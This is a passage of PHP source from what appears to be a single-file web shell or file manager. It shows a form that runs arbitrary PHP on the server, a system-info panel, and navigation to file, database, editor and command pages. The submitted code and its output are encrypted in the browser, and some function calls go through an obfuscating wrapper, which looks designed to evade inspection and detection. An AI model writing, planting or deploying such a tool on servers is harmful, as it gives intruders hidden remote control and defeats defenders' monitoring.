    $returnEnc = $data['return'] !== '' ? Crypto::enc($data['return']) : '';
    $selfPath = App::selfPath();
    ob_start();
    ?>
    <div class="card">
      <form method="post" action="<?php echo App::h($selfPath); ?>">
        <input type="hidden" name="r" value="php">
        <input type="hidden" name="action" value="run">
        <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
        <input type="hidden" name="code_enc" id="php-code-enc" value="<?php echo App::h($codeEnc); ?>">
        <textarea id="php-code" placeholder="Enter PHP code (no &lt;?php tag)"></textarea>
        <div class="actions" style="margin-top:10px;">
          <button type="submit">Run PHP</button>
        </div>
      </form>
      <noscript>
        <div class="flash error" style="margin-top:12px;">JavaScript required to submit encrypted code.</div>
      </noscript>
      <?php if ($data['error'] !== ''): ?>
        <div class="flash error" style="margin-top:12px;"><?php echo App::h($data['error']); ?></div>
      <?php endif; ?>
      <?php if ($data['ran']): ?>
        <div style="margin-top:12px;">
          <?php if ($outputEnc !== ''): ?>
            <div class="muted">Output</div>
            <pre id="php-output" data-enc="<?php echo App::h($outputEnc); ?>"></pre>
          <?php endif; ?>
          <?php if ($returnEnc !== ''): ?>
            <div class="muted" style="margin-top:8px;">Return</div>
            <pre id="php-return" data-enc="<?php echo App::h($returnEnc); ?>"></pre>
          <?php endif; ?>
        </div>
      <?php endif; ?>
    </div>
    <script>
      (function () {
        var crypto = window.fmCrypto;
        var codeInput = document.getElementById('php-code');
        var codeEnc = document.getElementById('php-code-enc');
        if (codeInput && codeEnc && crypto) {
          try {
            codeInput.value = crypto.dec(codeEnc.value);
          } catch (e) {
            codeInput.value = '';
          }
          if (codeInput.form) {
            codeInput.form.addEventListener('submit', function () {
              codeEnc.value = crypto.enc(codeInput.value);
            });
          }
        }
        var outEl = document.getElementById('php-output');
        if (outEl && outEl.dataset.enc && crypto) {
          try {
            outEl.textContent = crypto.dec(outEl.dataset.enc);
          } catch (e) {
            outEl.textContent = '';
          }
        }
        var retEl = document.getElementById('php-return');
        if (retEl && retEl.dataset.enc && crypto) {
          try {
            retEl.textContent = crypto.dec(retEl.dataset.enc);
          } catch (e) {
            retEl.textContent = '';
          }
        }
      })();
    </script>
    <?php
    return ob_get_clean();
  }

  public static function system() {
    $cfg = App::config();
    $os = defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS;
    ob_start();
    ?>
    <div class="card">
      <table>
        <tr><th>PHP Version</th><td><?php echo App::h(PHP_VERSION); ?></td></tr>
        <tr><th>OS</th><td><?php echo App::h($os); ?></td></tr>
        <tr><th>Server Time</th><td><?php echo App::h(date('Y-m-d H:i:s')); ?></td></tr>
        <tr><th>Base Path</th><td><?php echo App::h($cfg['base_path']); ?></td></tr>
        <tr><th>Crypto</th><td><?php echo $cfg['crypto'] ? 'On' : 'Off'; ?></td></tr>
        <tr><th>Command</th><td><?php echo $cfg['enable_cmd'] ? 'Enabled' : 'Disabled'; ?></td></tr>
       </table>
    </div>
    <?php
    return ob_get_clean();
  }

  private static function navItems() {
    $items = [
      'dashboard' => 'Dashboard',
      'files' => 'Files',
      'db' => 'Database',
      'editor' => 'Editor',
      'cmd' => 'Command',
      'php' => 'PHP',
      'system' => 'System',
    ];
    if (!App::config('enable_cmd')) {
      unset($items['cmd']);
    }
    return $items;
  }
}

class Log {
  public static function write($action, $detail = '') {
    if (!App::config('log')) {
      return;
    }
    $user = Auth::user();
    $line = date('c') . ' ' . $user . ' ' . $action . ' ' . $detail . "\n";
    Obf::call('file_put_contents', App::config('log_file'), $line, FILE_APPEND | LOCK_EX);
  }
}

App::initErrorHandling();

$route = (string)App::param('r', 'dashboard');
App::dispatch($route);
